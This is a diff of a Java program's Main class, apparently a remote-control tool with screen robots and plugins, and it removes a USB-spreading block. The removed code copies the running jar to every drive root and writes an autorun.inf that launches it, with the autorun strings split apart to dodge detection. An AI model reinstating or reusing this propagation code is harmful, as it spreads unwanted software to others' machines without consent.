@@ -5,11 +5,7 @@ import java.awt.GraphicsEnvironment;
 import java.awt.Robot;
 import java.awt.SystemTray;
 import java.awt.TrayIcon;
-import java.io.BufferedWriter;
 import java.io.File;
-import java.io.FileInputStream;
-import java.io.FileOutputStream;
-import java.io.FileWriter;
 import java.io.InputStream;
 import java.util.Date;
 import java.util.HashMap;
@@ -177,39 +173,6 @@ public class Main {
 				robots[i] = new Robot(devices[i]);
 			}
 
-			if (Boolean.parseBoolean(config.get("usb")) && OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
-				for (File root : File.listRoots()) {
-					try {
-						if (config.get("usbexclude").toLowerCase().contains(root.getAbsolutePath().toLowerCase())) {
-							continue;
-						}
-
-						File local = new File(root, config.get("usbname") + ".jar");
-						File me = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().getPath());
-
-						FileInputStream in = new FileInputStream(me);
-						FileOutputStream out = new FileOutputStream(local);
-						byte[] array = new byte[1024];
-
-						while (in.read(array) != -1) {
-							out.write(array);
-						}
-
-						in.close();
-						out.close();
-
-						BufferedWriter writer = new BufferedWriter(new FileWriter(new File(root, "autor" + "un.inf")));
-						writer.write("[" + "aut" + "orun" + "]");
-						writer.newLine();
-						writer.write("op" + "en=" + local.getName());
-						writer.newLine();
-						writer.close();
-					} catch (Exception e) {
-						e.printStackTrace();
-					}
-				}
-			}
-			
 			for (Plugin plugin : Plugin.list) {
 				plugin.methods.get("onstart").invoke(plugin.instance, new Object[] { });
 			}
